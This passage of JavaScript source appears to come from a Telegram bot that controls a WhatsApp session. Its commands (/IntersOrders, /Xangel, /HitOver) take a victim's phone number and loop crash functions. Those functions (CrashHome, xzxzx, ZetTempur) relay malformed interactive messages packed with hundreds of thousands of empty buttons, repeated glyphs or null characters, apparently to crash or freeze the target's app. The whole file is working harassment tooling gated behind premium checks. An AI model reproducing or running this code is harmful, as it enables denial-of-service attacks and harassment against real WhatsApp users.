  if (!q) return ctx.reply("🪧 ☇ Example : /IntersOrders 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const time = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });

  await ctx.reply(
    `
<blockquote><b>𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 𝑽𝒗𝒊𝒑
ᝰ.ᐟ Target : ✆ ${q}
 🕷 Status : 𝐓𝐞𝐫𝐤𝐢𝐫𝐢𝐦 𝐊𝐞 𝐓𝐚𝐫𝐠𝐞𝐭
</b></blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "5355021020572962395" }
          ]
        ]
      }
    }
  );

  (async () => {
    for (let r = 0; r < 10; r++) {
      await CrashHome(sock, target);
      await sleep(1000);
    }
  })();

});

bot.command("Xangel", checkChannels, checkLocked, checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /Xangel 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const time = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });

  await ctx.reply(
    `
<blockquote><b>𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 𝑽𝒗𝒊𝒑
ᝰ.ᐟ Target : ✆ ${q}
 🕷 Status : 𝐓𝐞𝐫𝐤𝐢𝐫𝐢𝐦 𝐊𝐞 𝐓𝐚𝐫𝐠𝐞𝐭
</b></blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "5355021020572962395" }
          ]
        ]
      }
    }
  );

  (async () => {
    for (let r = 0; r < 15; r++) {
      await CrashHome(target);
      await sleep(1000);
    }
  })();

});

bot.command("HitOver", checkChannels, checkLocked, checkAllPremium, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1]; 
  if (!q) return ctx.reply("🪧 ☇ Example : /HitOver 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const time = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });

  await ctx.reply(
    `
<blockquote><b>𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 𝑽𝒗𝒊𝒑
ᝰ.ᐟ Target : ✆ ${q}
 🕷 Status : 𝐓𝐞𝐫𝐤𝐢𝐫𝐢𝐦 𝐊𝐞 𝐓𝐚𝐫𝐠𝐞𝐭
</b></blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝐂𝐞𝐤 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "5355021020572962395" }
          ]
        ]
      }
    }
  );

  (async () => {
    for (let r = 0; r < 15; r++) {
      await CrashHome(sock, target);
      await xzxzx(sock, target);
      await sleep(1000);
    }
  })();

});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function CrashHome(sock, target) {
const CrBLock = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "Gapon Super Imuttt😻🥰😍"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const Crb = generateWAMessageFromContent(target, CrBLock, {});

await sock.relayMessage(target, Crb.message, {
messageId: Crb.key.id
})
}

async function xzxzx(sock, target) {
  const msg = {
    interactiveMessage: {
      body: { text: "GAPON GANTENG BGTTTT" },
      nativeFlowMessage: {
        buttons: "ꦾ".repeat(500000)
      },
      contextInfo: {
        mentionedJid: [target]
      }
    }
  };

  for (let i = 0; i < 500; i++) {
    await sock.relayMessage(target, msg, {}).catch(() => {});
    await new Promise(r => setTimeout(r, 30));
  }
}

async function ZetTempur(sock, target) {
const CrBLay = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Gapon Imut Bangett 🥵🥰",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
 const Crb1 = generateWAMessageFromContent(target, CrBLay, {});

await sock.relayMessage(target, Crb1.message, {
messageId: Crb1.key.id
})

await sleep(200);

const CrBDoj = {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Gapon Imut Banget Bangsat",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        },
      },
    },
  };
  
const Crb2 = generateWAMessageFromContent(target, CrBDoj, {});

await sock.relayMessage(target, Crb2.message, {
messageId: Crb2.key.id
})

await sleep(200);

const CrBLol = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Gapon Imut Bgt Bangke",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              },
            },
          },
        },
      },
    },
  };

const Crb3 = generateWAMessageFromContent(target, CrBLol, {});

await sock.relayMessage(target, Crb3.message, {
messageId: Crb3.key.id
})
}



// ━━━〔  MEMJALANKAN - BOT  〕━━━ //

(async () => {
  try {
    console.clear();

    const startTime = Date.now();

    const log = (msg) => console.log(`\x1b[36m${msg}\x1b[0m`);
    const success = (msg) => console.log(`\x1b[32m${msg}\x1b[0m`);
    const error = (msg) => console.log(`\x1b[31m${msg}\x1b[0m`);

    console.log(`
╔══════════════════════════════╗
║      ⚡ SCRIPT BERKUALITAS HIGH  ⚡     ║
╚══════════════════════════════╝
`);

    log("🔄 Initializing system...");

    currentMode = getMode();
    success(`⚙️ Mode Loaded → ${currentMode}`);

    log("📡 Connecting WhatsApp session...");
    await startSesi();
    success("✅ WhatsApp Connected");

    log("🤖 Launching Telegram bot...");
    await bot.launch();
    success("✅ Telegram Bot Active");

    process.once("SIGINT", () => {
      error("🛑 SIGINT detected, shutting down...");
      bot.stop("SIGINT");
    });

    process.once("SIGTERM", () => {
      error("🛑 SIGTERM detected, shutting down...");
      bot.stop("SIGTERM");
    });

    const uptime = ((Date.now() - startTime) / 1000).toFixed(2);

    console.log(`
╔══════════════════════════════╗
║   🟢 SYSTEM ACTIVED & ONLINE     ║
╠══════════════════════════════╣
║ ⏱️ Startup : ${uptime}s
║ 🔐 Status  : SECURE
║ 🌸 System  : ACTIVE
╚══════════════════════════════╝
`);

  } catch (err) {
    console.clear();

    console.log(`
╔══════════════════════════════╗
║      ❌ SYSTEM GAGAL        ║
╚══════════════════════════════╝
`);

    console.error("\x1b[31m", err, "\x1b[0m");

    setTimeout(() => {
      console.log("\x1b[33m🔄 Auto Restarting System...\x1b[0m");
      process.exit(1);
    }, 3000);
  }
})();